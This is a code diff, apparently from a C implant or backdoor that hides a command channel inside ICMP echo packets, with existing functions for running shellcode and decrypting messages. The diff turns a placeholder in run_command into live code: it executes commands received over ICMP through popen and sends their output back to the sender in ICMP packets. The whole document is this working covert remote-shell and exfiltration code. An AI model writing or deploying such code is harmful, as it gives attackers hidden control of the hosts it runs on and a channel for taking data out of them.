@@ -99,7 +99,21 @@ void run_shellcode(const unsigned char *shellcode, uint32_t size) {
 }
 
 void run_command(const unsigned char *command, uint32_t size, const struct iphdr *ip, const struct icmphdr *icmp) {
-	printf("I would love to run: %s\n", command);
+	FILE *fd = NULL;
+	uint8_t cmd[size + 1], buf[MAX_PACKET_SIZE];
+	uint32_t read = 0;
+
+	// Need to copy and null terminate the command
+	memset(cmd, 0, size + 1);
+	memcpy(cmd, command, size);
+
+	// Execute the command
+	if((fd = popen(command, "r")) != NULL) {
+
+		while((read = fread(buf, 1, MAX_PACKET_SIZE, fd)) > 0) {
+			send_packet(buf, read, ip, icmp);
+		}
+	}
 }
 
 int decrypt_message(const unsigned char *data, unsigned char *decoded_data, uint32_t size, unsigned char *key) {
@@ -117,8 +131,6 @@ void process_message(const unsigned char *data, uint32_t size, const struct iphd
 	unsigned char *key = (unsigned char *)&(icmp->un.echo.sequence);
 	uint32_t data_len = 0, hdr_len = 0;
 	uint8_t msg_type = 0;
-
-	send_packet("ABCD", 4, ip, icmp);
 
 	// Make sure we have data
 	if(size > 0) {
